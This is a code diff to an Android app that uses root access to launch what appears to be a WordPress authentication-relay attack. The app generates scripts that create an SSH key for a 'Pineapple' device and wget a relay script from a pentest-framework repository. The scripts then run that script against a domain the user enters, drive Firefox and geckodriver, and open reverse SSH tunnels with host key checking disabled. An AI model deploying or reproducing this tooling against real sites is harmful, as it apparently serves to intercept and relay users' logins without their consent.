@@ -3,7 +3,12 @@ package com.example.wordpressrelayapp
 import android.content.ActivityNotFoundException
 import android.content.Intent
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.text.InputType
+import android.text.method.ScrollingMovementMethod
 import android.widget.Button
+import android.widget.EditText
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import java.io.BufferedReader
@@ -15,7 +20,7 @@ class MainActivity : AppCompatActivity() {
     private val TERMUX_HOME = "/data/data/com.termux/files/home"
     private val TERMUX_BASH = "/data/data/com.termux/files/usr/bin/bash"
     private val SD_SCRIPT = "/sdcard/x11_start.sh"
-    
+
     // Dynamic values to be populated
     private var termuxUid: String = ""
     private var termuxGid: String = ""
@@ -26,7 +31,7 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
 
         val textView = findViewById<TextView>(R.id.textView)
-        textView.movementMethod = android.text.method.ScrollingMovementMethod()
+        textView.movementMethod = ScrollingMovementMethod()
         val button1 = findViewById<Button>(R.id.button1)
         val button2 = findViewById<Button>(R.id.button2)
         val button3 = findViewById<Button>(R.id.button3)
@@ -36,21 +41,23 @@ class MainActivity : AppCompatActivity() {
         detectTermuxIds()
 
         button1.setOnClickListener {
-             textView.text = "Checking Termux installation..."
+            textView.text = "Checking Termux installation..."
 
-             Thread {
+            Thread {
                 try {
                     val diagnostics = StringBuilder()
                     diagnostics.appendLine("=== TERMUX DETECTION ===\n")
-            
+
                     // Step 1: Check root access
                     diagnostics.appendLine("1. Checking root access...")
                     try {
                         val rootProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
-                        val rootOutput = BufferedReader(InputStreamReader(rootProc.inputStream)).use { it.readText() }
-                        val rootError = BufferedReader(InputStreamReader(rootProc.errorStream)).use { it.readText() }
+                        val rootOutput =
+                            BufferedReader(InputStreamReader(rootProc.inputStream)).use { it.readText() }
+                        val rootError =
+                            BufferedReader(InputStreamReader(rootProc.errorStream)).use { it.readText() }
                         val rootExit = rootProc.waitFor()
-                
+
                         if (rootExit == 0) {
                             diagnostics.appendLine("   ✅ Root access available\n")
                         } else {
@@ -66,21 +73,23 @@ class MainActivity : AppCompatActivity() {
                         runOnUiThread { textView.text = diagnostics.toString() }
                         return@Thread
                     }
-            
+
                     // Step 2: Check packages.list for Termux
                     try {
-                        val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep com.termux /data/system/packages.list"))
-                        val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
+                        val listProc = Runtime.getRuntime()
+                            .exec(arrayOf("su", "-c", "grep com.termux /data/system/packages.list"))
+                        val listOutput =
+                            BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
                         val listExit = listProc.waitFor()
-                
+
                         if (listExit != 0 || listOutput.isBlank()) {
                             diagnostics.appendLine("2. ❌ Termux not found\n")
                             runOnUiThread { textView.text = diagnostics.toString() }
                             return@Thread
                         }
-                
+
                         diagnostics.appendLine("2. ✅ Termux installed\n")
-                
+
                         // Format: com.termux 10321 0 /data/user/0/com.termux ...
                         val parts = listOutput.trim().split("\\s+".toRegex())
                         if (parts.size < 2) {
@@ -88,7 +97,7 @@ class MainActivity : AppCompatActivity() {
                             runOnUiThread { textView.text = diagnostics.toString() }
                             return@Thread
                         }
-                
+
                         val termuxAppId = parts[1].toIntOrNull()
                         if (termuxAppId == null) {
                             diagnostics.appendLine("   ❌ Could not parse UID from packages.list")
@@ -97,8 +106,10 @@ class MainActivity : AppCompatActivity() {
                         }
 
                         // Step 3: Check packages.list for Termux:X11
-                        val x11Proc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep com.termux.x11 /data/system/packages.list"))
-                        val x11Output = BufferedReader(InputStreamReader(x11Proc.inputStream)).use { it.readText() }
+                        val x11Proc = Runtime.getRuntime()
+                            .exec(arrayOf("su", "-c", "grep com.termux.x11 /data/system/packages.list"))
+                        val x11Output =
+                            BufferedReader(InputStreamReader(x11Proc.inputStream)).use { it.readText() }
                         val x11Exit = x11Proc.waitFor()
 
                         if (x11Exit != 0 || x11Output.isBlank()) {
@@ -108,12 +119,12 @@ class MainActivity : AppCompatActivity() {
                         }
 
                         diagnostics.appendLine("4. ✅ Termux:X11 installed\n")
-                
+
                         // Step 4: Calculate standard Android groups
                         diagnostics.appendLine("4. Calculating standard Android groups...")
-                
+
                         val appId = termuxAppId - 10000  // Extract app number (e.g., 10321 -> 321)
-                
+
                         diagnostics.appendLine("   Termux UID: $termuxAppId")
                         diagnostics.appendLine("   App ID: $appId")
                         diagnostics.appendLine("   Primary GID: $termuxAppId")
@@ -122,20 +133,20 @@ class MainActivity : AppCompatActivity() {
                         diagnostics.appendLine("     - 9997 (everybody)")
                         diagnostics.appendLine("     - ${20000 + appId} (cache group)")
                         diagnostics.appendLine("     - ${50000 + appId} (all group)")
-                
+
                     } catch (e: Exception) {
                         diagnostics.appendLine("   ❌ Exception: ${e.message}")
                         diagnostics.appendLine("\nStack trace:")
                         diagnostics.appendLine(e.stackTraceToString())
                     }
-            
+
                     runOnUiThread {
                         textView.text = diagnostics.toString()
                     }
-            
+
                 } catch (e: Exception) {
-                    runOnUiThread { 
-                        textView.text = "Error: ${e.message}\n${e.stackTraceToString()}" 
+                    runOnUiThread {
+                        textView.text = "Error: ${e.message}\n${e.stackTraceToString()}"
                     }
                 }
             }.start()
@@ -148,8 +159,8 @@ class MainActivity : AppCompatActivity() {
                 try {
                     val (success, errorMsg) = ensureTermuxIdsDetected()
                     if (!success) {
-                        runOnUiThread { 
-                            textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg" 
+                        runOnUiThread {
+                            textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg"
                         }
                         return@Thread
                     }
@@ -160,9 +171,9 @@ class MainActivity : AppCompatActivity() {
                     scriptLines.add("")
                     scriptLines.add("export HOME=/data/data/com.termux/files/home")
                     scriptLines.add("export PREFIX=/data/data/com.termux/files/usr")
-                    scriptLines.add("export PATH=\"\$PREFIX/bin:\$PATH\"")
+                    scriptLines.add("export PATH=\"${'$'}PREFIX/bin:${'$'}PATH\"")
                     scriptLines.add("")
-                    scriptLines.add("cd \"\$HOME\"")
+                    scriptLines.add("cd \"${'$'}HOME\"")
                     scriptLines.add("")
                     scriptLines.add("echo 'Checking files...' > prereq_check.log")
                     scriptLines.add("")
@@ -177,60 +188,69 @@ class MainActivity : AppCompatActivity() {
                     scriptLines.add("else")
                     scriptLines.add("    echo 'SCRIPT:MISSING'")
                     scriptLines.add("fi")
-                    
+
                     val checkScript = scriptLines.joinToString("\n")
                     val checkScriptPath = "/sdcard/check_prereqs.sh"
                     writeFileAsRoot(checkScriptPath, checkScript)
                     execAsRoot("chmod 644 $checkScriptPath")
-                    
-                    val checkPipeline = "cat $checkScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
-                    val checkProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", checkPipeline))
-                    val checkOutput = BufferedReader(InputStreamReader(checkProc.inputStream)).use { it.readText() }
-                    val checkError = BufferedReader(InputStreamReader(checkProc.errorStream)).use { it.readText() }
+
+                    val checkPipeline =
+                        "cat $checkScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
+                    val checkProc =
+                        Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", checkPipeline))
+                    val checkOutput =
+                        BufferedReader(InputStreamReader(checkProc.inputStream)).use { it.readText() }
+                    val checkError =
+                        BufferedReader(InputStreamReader(checkProc.errorStream)).use { it.readText() }
                     checkProc.waitFor()
-                    
+
                     val sshKeyExists = checkOutput.contains("SSH_KEY:EXISTS")
                     val pythonScriptExists = checkOutput.contains("SCRIPT:EXISTS")
-                    
+
                     if (sshKeyExists && pythonScriptExists) {
                         runOnUiThread {
-                            textView.text = "✅ Private SSH Key and Relay Script Exist in Current Directory\n\nReady to proceed!"
+                            textView.text =
+                                "✅ Private SSH Key and Relay Script Exist in Current Directory\n\nReady to proceed!"
                         }
                         return@Thread
                     }
-                    
+
                     val statusMessage = StringBuilder()
                     statusMessage.appendLine("=== Setting Up Prerequisites ===\n")
-                    
+
                     var needToTransferKey = false
-                    
+
                     if (!sshKeyExists) {
                         statusMessage.appendLine("📝 Generating SSH key pair...")
-                        
+
                         val keygenLines = mutableListOf<String>()
                         keygenLines.add("#!/data/data/com.termux/files/usr/bin/bash")
                         keygenLines.add("set -e")
                         keygenLines.add("")
                         keygenLines.add("export HOME=/data/data/com.termux/files/home")
                         keygenLines.add("export PREFIX=/data/data/com.termux/files/usr")
-                        keygenLines.add("export PATH=\"\$PREFIX/bin:\$PATH\"")
+                        keygenLines.add("export PATH=\"${'$'}PREFIX/bin:${'$'}PATH\"")
                         keygenLines.add("")
-                        keygenLines.add("cd \"\$HOME\"")
+                        keygenLines.add("cd \"${'$'}HOME\"")
                         keygenLines.add("")
                         keygenLines.add("ssh-keygen -t ed25519 -f .ssh/pineapple -N ''")
                         keygenLines.add("echo 'KEYGEN:SUCCESS'")
-                        
+
                         val keygenScript = keygenLines.joinToString("\n")
                         val keygenScriptPath = "/sdcard/generate_key.sh"
                         writeFileAsRoot(keygenScriptPath, keygenScript)
                         execAsRoot("chmod 644 $keygenScriptPath")
-                        
-                        val keygenPipeline = "cat $keygenScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
-                        val keygenProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", keygenPipeline))
-                        val keygenOutput = BufferedReader(InputStreamReader(keygenProc.inputStream)).use { it.readText() }
-                        val keygenError = BufferedReader(InputStreamReader(keygenProc.errorStream)).use { it.readText() }
+
+                        val keygenPipeline =
+                            "cat $keygenScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
+                        val keygenProc =
+                            Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", keygenPipeline))
+                        val keygenOutput =
+                            BufferedReader(InputStreamReader(keygenProc.inputStream)).use { it.readText() }
+                        val keygenError =
+                            BufferedReader(InputStreamReader(keygenProc.errorStream)).use { it.readText() }
                         keygenProc.waitFor()
-                        
+
                         if (keygenOutput.contains("KEYGEN:SUCCESS")) {
                             statusMessage.appendLine("✅ SSH key pair generated!\n")
                             needToTransferKey = true
@@ -242,19 +262,19 @@ class MainActivity : AppCompatActivity() {
                     } else {
                         statusMessage.appendLine("✅ SSH key already exists\n")
                     }
-                    
+
                     if (!pythonScriptExists) {
                         statusMessage.appendLine("📥 Downloading wordpress-relay.py...")
-                        
+
                         val downloadLines = mutableListOf<String>()
                         downloadLines.add("#!/data/data/com.termux/files/usr/bin/bash")
                         downloadLines.add("set -e")
                         downloadLines.add("")
                         downloadLines.add("export HOME=/data/data/com.termux/files/home")
                         downloadLines.add("export PREFIX=/data/data/com.termux/files/usr")
-                        downloadLines.add("export PATH=\"\$PREFIX/bin:\$PATH\"")
+                        downloadLines.add("export PATH=\"${'$'}PREFIX/bin:${'$'}PATH\"")
                         downloadLines.add("")
-                        downloadLines.add("cd \"\$HOME\"")
+                        downloadLines.add("cd \"${'$'}HOME\"")
                         downloadLines.add("")
                         downloadLines.add("wget -q https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/android/execution/scripts/wordpress-relay.py")
                         downloadLines.add("")
@@ -263,18 +283,22 @@ class MainActivity : AppCompatActivity() {
                         downloadLines.add("else")
                         downloadLines.add("    echo 'DOWNLOAD:FAILED'")
                         downloadLines.add("fi")
-                        
+
                         val downloadScript = downloadLines.joinToString("\n")
                         val downloadScriptPath = "/sdcard/download_script.sh"
                         writeFileAsRoot(downloadScriptPath, downloadScript)
                         execAsRoot("chmod 644 $downloadScriptPath")
-                        
-                        val downloadPipeline = "cat $downloadScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
-                        val downloadProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", downloadPipeline))
-                        val downloadOutput = BufferedReader(InputStreamReader(downloadProc.inputStream)).use { it.readText() }
-                        val downloadError = BufferedReader(InputStreamReader(downloadProc.errorStream)).use { it.readText() }
+
+                        val downloadPipeline =
+                            "cat $downloadScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
+                        val downloadProc =
+                            Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", downloadPipeline))
+                        val downloadOutput =
+                            BufferedReader(InputStreamReader(downloadProc.inputStream)).use { it.readText() }
+                        val downloadError =
+                            BufferedReader(InputStreamReader(downloadProc.errorStream)).use { it.readText() }
                         downloadProc.waitFor()
-                        
+
                         if (downloadOutput.contains("DOWNLOAD:SUCCESS")) {
                             statusMessage.appendLine("✅ Python script downloaded!\n")
                         } else {
@@ -285,11 +309,11 @@ class MainActivity : AppCompatActivity() {
                     } else {
                         statusMessage.appendLine("✅ Python script already exists\n")
                     }
-                    
+
                     if (needToTransferKey) {
-                        statusMessage.appendLine("=" .repeat(50))
+                        statusMessage.appendLine("=".repeat(50))
                         statusMessage.appendLine("⚠️  IMPORTANT: SSH KEY TRANSFER REQUIRED")
-                        statusMessage.appendLine("=" .repeat(50))
+                        statusMessage.appendLine("=".repeat(50))
                         statusMessage.appendLine("\nYou must transfer the public key to the Pineapple.")
                         statusMessage.appendLine("\nOpen Termux and run these commands:\n")
                         statusMessage.appendLine("scp ~/.ssh/pineapple.pub root@172.16.42.1:/root/.ssh/authorized_keys")
@@ -301,11 +325,11 @@ class MainActivity : AppCompatActivity() {
                         statusMessage.appendLine("\n⚠️ Some prerequisites are missing or failed to setup.")
                         statusMessage.appendLine("Please check the error messages above.")
                     }
-                    
+
                     runOnUiThread {
                         textView.text = statusMessage.toString()
                     }
-                    
+
                 } catch (e: Exception) {
                     runOnUiThread { textView.text = "Error: ${e.message}\n${e.stackTraceToString()}" }
                 }
@@ -319,8 +343,8 @@ class MainActivity : AppCompatActivity() {
                 try {
                     val (success, errorMsg) = ensureTermuxIdsDetected()
                     if (!success) {
-                        runOnUiThread { 
-                            textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg" 
+                        runOnUiThread {
+                            textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg"
                         }
                         return@Thread
                     }
@@ -333,16 +357,16 @@ class MainActivity : AppCompatActivity() {
                                 flags = Intent.FLAG_ACTIVITY_NEW_TASK
                             }
                         startActivity(termuxLaunch)
-                        
+
                         Thread.sleep(2000)
-                        
+
                         val returnIntent = Intent(this@MainActivity, MainActivity::class.java).apply {
                             flags = Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                         }
                         startActivity(returnIntent)
-                        
+
                         Thread.sleep(500)
-                        
+
                     } catch (_: ActivityNotFoundException) {
                         runOnUiThread { textView.text = "❌ Termux not installed." }
                         return@Thread
@@ -351,13 +375,18 @@ class MainActivity : AppCompatActivity() {
                         return@Thread
                     }
 
-                    val proc = Runtime.getRuntime().exec(arrayOf(
-                        "su", termuxUid, "-c",
-                        "ping -c 4 172.16.42.1"
-                    ))
+                    // Added timeout to ping command (15 seconds max)
+                    val proc = Runtime.getRuntime().exec(
+                        arrayOf(
+                            "su", termuxUid, "-c",
+                            "timeout 15 ping -c 4 172.16.42.1"
+                        )
+                    )
 
-                    val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
-                    val error = BufferedReader(InputStreamReader(proc.errorStream)).use { it.readText() }
+                    val output =
+                        BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
+                    val error =
+                        BufferedReader(InputStreamReader(proc.errorStream)).use { it.readText() }
                     val exitCode = proc.waitFor()
 
                     runOnUiThread {
@@ -373,10 +402,10 @@ class MainActivity : AppCompatActivity() {
                                 appendLine(error.trim())
                             }
                             appendLine("")
-                            if (exitCode == 0) {
-                                appendLine("✅ Pineapple is reachable!")
-                            } else {
-                                appendLine("❌ Pineapple is NOT reachable")
+                            when (exitCode) {
+                                0 -> appendLine("✅ Pineapple is reachable!")
+                                124 -> appendLine("❌ Connection timed out after 15 seconds")
+                                else -> appendLine("❌ Pineapple is NOT reachable")
                             }
                         }.trim()
                     }
@@ -385,43 +414,47 @@ class MainActivity : AppCompatActivity() {
                 }
             }.start()
         }
-        
+
+        // =========================
+        // UPDATED BUTTON 4 BEHAVIOR
+        // =========================
         button4.setOnClickListener {
-            val input = android.widget.EditText(this)
+            val input = EditText(this)
             input.hint = "https://example.com"
-            input.inputType = android.text.InputType.TYPE_TEXT_VARIATION_URI
-    
+            input.inputType = InputType.TYPE_TEXT_VARIATION_URI
+
             android.app.AlertDialog.Builder(this)
                 .setTitle("Enter WordPress Domain")
                 .setMessage("Enter the full WordPress domain URL:")
                 .setView(input)
                 .setPositiveButton("Start") { dialog, _ ->
                     val domain = input.text.toString().trim()
-            
+
                     if (domain.isEmpty()) {
                         textView.text = "❌ Domain cannot be empty"
                         dialog.dismiss()
                         return@setPositiveButton
                     }
-            
+
                     if (!domain.startsWith("http://") && !domain.startsWith("https://")) {
                         textView.text = "❌ Domain must start with http:// or https://"
                         dialog.dismiss()
                         return@setPositiveButton
                     }
-            
+
                     textView.text = "Creating script and launching…"
 
                     Thread {
                         try {
                             val (success, errorMsg) = ensureTermuxIdsDetected()
                             if (!success) {
-                                runOnUiThread { 
-                                    textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg" 
+                                runOnUiThread {
+                                    textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg"
                                 }
                                 return@Thread
                             }
 
+                            // Build the script that does everything but DOES NOT switch to X11 here
                             val scriptContent = """
                                 #!$TERMUX_BASH
                                 set -e
@@ -429,22 +462,21 @@ class MainActivity : AppCompatActivity() {
                                 export HOME=$TERMUX_HOME
                                 export PREFIX=/data/data/com.termux/files/usr
                                 export PATH="${'$'}PREFIX/bin:${'$'}PATH"
-                        
+
                                 # Critical: Set TMPDIR before anything else
                                 export TMPDIR="${'$'}HOME/tmp"
-                        
+
                                 # Use TCP connection instead of Unix socket
                                 export DISPLAY=:0
-                        
+
                                 # Prevent headless mode
                                 unset MOZ_HEADLESS
                                 export MOZ_CRASHREPORTER_DISABLE=1
-                        
-                                mkdir -p "${'$'}TMPDIR"
 
+                                mkdir -p "${'$'}TMPDIR"
                                 cd "${'$'}HOME"
 
-                                echo "Button 3 pressed at ${'$'}(date)" > button4_test.log || true
+                                echo "Button 4 pressed at ${'$'}(date)" > button4_test.log || true
 
                                 # Aggressive cleanup of prior instances
                                 echo "Cleaning up previous processes..." > cleanup.log
@@ -453,25 +485,21 @@ class MainActivity : AppCompatActivity() {
                                 pkill -9 -f firefox || true
                                 pkill -9 -f termux-x11 || true
                                 pkill -f 'ssh.*172.16.42.1' || true
-                        
+
                                 # Wait for ports to be released
                                 echo "Waiting for ports to be released..." >> cleanup.log
                                 for i in {1..10}; do
-                                    if ! netstat -tuln | grep -E "(6000|4444|8080|9998)" > /dev/null 2>&1; then
-                                        echo "All ports released after ${'$'}i seconds" >> cleanup.log
-                                        break
-                                    fi
-                                    sleep 1
+                                  if ! netstat -tuln | grep -E "(6000|4444|8080|9998)" > /dev/null 2>&1; then
+                                    echo "All ports released after ${'$'}i seconds" >> cleanup.log
+                                    break
+                                  fi
+                                  sleep 1
                                 done
-                        
-                                # Extra wait to ensure clean state
                                 sleep 2
 
-                                # Start the X11 server with TCP listening enabled
+                                # Start the X11 server with TCP listening enabled (do NOT switch app here)
                                 echo "Starting X11 server with TCP..." > x11_output.log
                                 echo "DISPLAY=${'$'}DISPLAY" >> x11_output.log
-                        
-                                # Start termux-x11 listening on TCP port 6000
                                 termux-x11 :0 -ac -listen tcp >> x11_output.log 2>&1 &
                                 X11_PID=${'$'}!
                                 echo "X11 started with PID: ${'$'}X11_PID" >> x11_output.log
@@ -479,29 +507,24 @@ class MainActivity : AppCompatActivity() {
                                 # Wait for X11 to be listening on TCP port 6000
                                 X11_READY=0
                                 for i in {1..30}; do
-                                    if ! kill -0 ${'$'}X11_PID 2>/dev/null; then
-                                        echo "ERROR: X11 process died" >> x11_output.log
-                                        exit 1
-                                    fi
-                            
-                                    # Check if port 6000 is listening
-                                    if netstat -tuln | grep -q ":6000 "; then
-                                        echo "✓ X11 listening on TCP port 6000 after ${'$'}i seconds" >> x11_output.log
-                                        netstat -tuln | grep ":6000 " >> x11_output.log
-                                        X11_READY=1
-                                        break
-                                    fi
-                            
-                                    sleep 1
-                                done
-
-                                if [ "${'$'}X11_READY" -eq 0 ]; then
-                                    echo "ERROR: X11 not listening on port 6000" >> x11_output.log
-                                    netstat -tuln >> x11_output.log
+                                  if ! kill -0 ${'$'}X11_PID 2>/dev/null; then
+                                    echo "ERROR: X11 process died" >> x11_output.log
                                     exit 1
+                                  fi
+                                  if netstat -tuln | grep -q ":6000 "; then
+                                    echo "✓ X11 listening on TCP port 6000 after ${'$'}i seconds" >> x11_output.log
+                                    netstat -tuln | grep ":6000 " >> x11_output.log
+                                    X11_READY=1
+                                    break
+                                  fi
+                                  sleep 1
+                                done
+                                if [ "${'$'}X11_READY" -eq 0 ]; then
+                                  echo "ERROR: X11 not listening on port 6000" >> x11_output.log
+                                  netstat -tuln >> x11_output.log
+                                  exit 1
                                 fi
 
-                                # Extra stabilization
                                 sleep 3
 
                                 # Test Firefox connection using TCP
@@ -509,15 +532,14 @@ class MainActivity : AppCompatActivity() {
                                 timeout 10 firefox --no-remote --new-instance about:blank > firefox_test.log 2>&1 &
                                 FIREFOX_TEST_PID=${'$'}!
                                 sleep 4
-                        
                                 if kill -0 ${'$'}FIREFOX_TEST_PID 2>/dev/null; then
-                                    echo "✓ Firefox test SUCCESSFUL (PID: ${'$'}FIREFOX_TEST_PID)" >> x11_output.log
-                                    kill ${'$'}FIREFOX_TEST_PID 2>/dev/null || true
-                                    pkill -f firefox || true
-                                    sleep 2
+                                  echo "✓ Firefox test SUCCESSFUL (PID: ${'$'}FIREFOX_TEST_PID)" >> x11_output.log
+                                  kill ${'$'}FIREFOX_TEST_PID 2>/dev/null || true
+                                  pkill -f firefox || true
+                                  sleep 2
                                 else
-                                    echo "✗ Firefox test FAILED" >> x11_output.log
-                                    cat firefox_test.log >> x11_output.log
+                                  echo "✗ Firefox test FAILED" >> x11_output.log
+                                  cat firefox_test.log >> x11_output.log
                                 fi
 
                                 # Log environment
@@ -540,18 +562,17 @@ class MainActivity : AppCompatActivity() {
                                 GECKO_PID=${'$'}!
                                 echo "Geckodriver PID: ${'$'}GECKO_PID" >> x11_output.log
                                 sleep 3
-
                                 if ! kill -0 ${'$'}GECKO_PID 2>/dev/null; then
-                                    echo "ERROR: Geckodriver died" >> x11_output.log
-                                    cat geckodriver.log >> x11_output.log
-                                    exit 1
+                                  echo "ERROR: Geckodriver died" >> x11_output.log
+                                  cat geckodriver.log >> x11_output.log
+                                  exit 1
                                 fi
 
                                 # Start Python relay with user-provided domain
                                 echo "Starting Python relay with domain: $domain..." >> x11_output.log
                                 python "${'$'}HOME/wordpress-relay.py" --domain $domain --port 8080 > python_output.log 2>&1 &
                                 PYTHON_PID=${'$'}!
-                        
+
                                 echo "=== All processes started ===" >> x11_output.log
                                 echo "X11: ${'$'}X11_PID (TCP port 6000)" >> x11_output.log
                                 echo "Geckodriver: ${'$'}GECKO_PID (port 4444)" >> x11_output.log
@@ -562,23 +583,22 @@ class MainActivity : AppCompatActivity() {
                                 echo "=== SSH Port Forward Setup ===" >> x11_output.log
                                 echo "Waiting for port 8080 to be ready..." >> x11_output.log
                                 echo 'Setting up port forwards...' > ssh_setup.log
-                                
+
                                 PORT_READY=0
                                 for i in {1..30}; do
-                                    if netstat -tuln | grep -q ':8080 '; then
-                                        echo "✓ Port 8080 is ready after ${'$'}i seconds" >> x11_output.log
-                                        echo "Port 8080 is ready after ${'$'}i seconds" >> ssh_setup.log
-                                        PORT_READY=1
-                                        break
-                                    fi
-                                    sleep 1
+                                  if netstat -tuln | grep -q ':8080 '; then
+                                    echo "✓ Port 8080 is ready after ${'$'}i seconds" >> x11_output.log
+                                    echo "Port 8080 is ready after ${'$'}i seconds" >> ssh_setup.log
+                                    PORT_READY=1
+                                    break
+                                  fi
+                                  sleep 1
                                 done
-
                                 if [ "${'$'}PORT_READY" -eq 0 ]; then
-                                    echo 'ERROR: Port 8080 not ready after 30 seconds' >> x11_output.log
-                                    echo 'ERROR: Port 8080 not ready after 30 seconds' >> ssh_setup.log
-                                    echo 'Python relay may have failed to start' >> ssh_setup.log
-                                    exit 1
+                                  echo 'ERROR: Port 8080 not ready after 30 seconds' >> x11_output.log
+                                  echo 'ERROR: Port 8080 not ready after 30 seconds' >> ssh_setup.log
+                                  echo 'Python relay may have failed to start' >> ssh_setup.log
+                                  exit 1
                                 fi
 
                                 # Kill any existing SSH tunnels
@@ -586,23 +606,38 @@ class MainActivity : AppCompatActivity() {
                                 pkill -f 'ssh.*172.16.42.1' || true
                                 sleep 2
 
+                                # NETWORK CONNECTIVITY CHECK BEFORE SSH
+                                echo "Checking network connectivity to Pineapple..." >> ssh_setup.log
+                                if timeout 10 ping -c 2 172.16.42.1 > /dev/null 2>&1; then
+                                  echo "✓ Network connectivity confirmed" >> ssh_setup.log
+                                else
+                                  echo "✗ FATAL: Cannot reach Pineapple at 172.16.42.1" >> ssh_setup.log
+                                  echo "SSH_SETUP_FAILED:NO_NETWORK" >> ssh_setup.log
+                                  exit 2
+                                fi
+
                                 # Set up SSH port forward 1: Pineapple:9999 → Android:8080
                                 echo "Setting up Forward 1: Pineapple:9999 → Android:8080" >> ssh_setup.log
-                                nohup ssh -i ~/.ssh/pineapple -o StrictHostKeyChecking=no -N -R 9999:localhost:8080 root@172.16.42.1 > ssh_forward1.log 2>&1 &
+                                nohup ssh -i ~/.ssh/pineapple -o StrictHostKeyChecking=no -o ConnectTimeout=10 -N -R 9999:localhost:8080 root@172.16.42.1 > ssh_forward1.log 2>&1 &
                                 FORWARD1_PID=${'$'}!
                                 echo "Forward 1 PID: ${'$'}FORWARD1_PID" >> ssh_setup.log
                                 echo "Forward 1 started with PID: ${'$'}FORWARD1_PID" >> x11_output.log
-
-                                sleep 2
+                                sleep 3
+                                if ! kill -0 ${'$'}FORWARD1_PID 2>/dev/null; then
+                                  echo "✗ FATAL: Forward 1 SSH tunnel failed to establish" >> ssh_setup.log
+                                  cat ssh_forward1.log >> ssh_setup.log
+                                  echo "SSH_SETUP_FAILED:FORWARD1_DIED" >> ssh_setup.log
+                                  exit 2
+                                fi
+                                echo "✓ Forward 1 verified running" >> ssh_setup.log
 
                                 # Set up SSH port forward 2: Android:9998 → Pineapple:80
                                 echo "Setting up Forward 2: Android:9998 → Pineapple:80" >> ssh_setup.log
-                                nohup ssh -i ~/.ssh/pineapple -o StrictHostKeyChecking=no -N -L 9998:172.16.42.1:80 root@172.16.42.1 > ssh_forward2.log 2>&1 &
+                                nohup ssh -i ~/.ssh/pineapple -o StrictHostKeyChecking=no -o ConnectTimeout=10 -N -L 9998:172.16.42.1:80 root@172.16.42.1 > ssh_forward2.log 2>&1 &
                                 FORWARD2_PID=${'$'}!
                                 echo "Forward 2 PID: ${'$'}FORWARD2_PID" >> ssh_setup.log
                                 echo "Forward 2 started with PID: ${'$'}FORWARD2_PID" >> x11_output.log
-
-                                sleep 2
+                                sleep 3
 
                                 # Verify SSH tunnels are running
                                 echo '' >> ssh_setup.log
@@ -613,9 +648,10 @@ class MainActivity : AppCompatActivity() {
                                 echo '=== Port Status ===' >> ssh_setup.log
                                 netstat -tuln | grep -E '(8080|9998)' >> ssh_setup.log || echo 'Ports not listening yet' >> ssh_setup.log
 
+                                echo 'SSH_SETUP_SUCCESS' >> ssh_setup.log
                                 echo 'SSH setup complete!' >> ssh_setup.log
                                 echo "✓ SSH port forwards configured" >> x11_output.log
-                                
+
                                 echo "" >> x11_output.log
                                 echo "=== COMPLETE SETUP SUMMARY ===" >> x11_output.log
                                 echo "All services started and SSH tunnels established" >> x11_output.log
@@ -629,6 +665,7 @@ class MainActivity : AppCompatActivity() {
                             writeFileAsRoot(SD_SCRIPT, scriptContent)
                             execAsRoot("chmod 644 $SD_SCRIPT")
 
+                            // Do NOT switch to X11 yet. Execute, gather logs, then conditionally launch.
                             try {
                                 val termuxLaunch = packageManager.getLaunchIntentForPackage("com.termux")
                                     ?: Intent().apply {
@@ -636,40 +673,32 @@ class MainActivity : AppCompatActivity() {
                                         flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                     }
                                 startActivity(termuxLaunch)
-                                Thread.sleep(2000)
+                                // Quickly return to our app
+                                Thread.sleep(1200)
+                                val returnIntent = Intent(this@MainActivity, MainActivity::class.java).apply {
+                                    flags = Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
+                                }
+                                startActivity(returnIntent)
                             } catch (_: ActivityNotFoundException) {
-                                runOnUiThread { textView.text = "Termux not installed." }
+                                runOnUiThread { textView.text = "❌ Termux not installed." }
                                 return@Thread
                             } catch (e: Exception) {
-                                runOnUiThread { textView.text = "Unable to launch Termux (${e.message})." }
+                                runOnUiThread { textView.text = "❌ Unable to launch Termux (${e.message})." }
                                 return@Thread
                             }
 
-                            try {
-                                val x11Launch = packageManager.getLaunchIntentForPackage("com.termux.x11")
-                                    ?: Intent().apply {
-                                        setClassName("com.termux.x11", "com.termux.x11.MainActivity")
-                                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                                    }
-                                startActivity(x11Launch)
-                            } catch (_: ActivityNotFoundException) {
-                                runOnUiThread { textView.text = "Termux:X11 not installed." }
-                                return@Thread
-                            } catch (e: Exception) {
-                                runOnUiThread { textView.text = "Unable to launch Termux:X11 (${e.message})." }
-                                return@Thread
-                            }
-
-                            Thread.sleep(3000)
-
